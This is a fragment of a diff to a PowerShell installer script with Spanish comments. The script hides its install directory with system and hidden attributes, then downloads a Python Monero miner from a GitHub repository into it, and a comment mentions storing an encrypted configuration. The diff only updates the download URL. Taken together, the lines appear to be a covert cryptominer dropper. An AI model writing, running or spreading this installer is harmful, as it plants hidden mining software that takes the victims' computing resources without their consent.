@@ -23,7 +23,7 @@ attrib +H +S $INSTALL_DIR 2>$null
 
 # ── Descargar miner.py ────────────────────────────────────
 Write-Host "  Descargando cliente..." -ForegroundColor Yellow
-$MINER_URL = "https://raw.githubusercontent.com/Anonymousxxz/XMRminer/main/miner.py"
+$MINER_URL = "https://raw.githubusercontent.com/Anonymousxxz/XMRminer/refs/heads/main/XMR-Miner-GitHub/miner.py"
 Invoke-WebRequest -Uri $MINER_URL -OutFile "$INSTALL_DIR\miner.py" -UseBasicParsing
 
 # ── Guardar config encriptada ─────────────────────────────
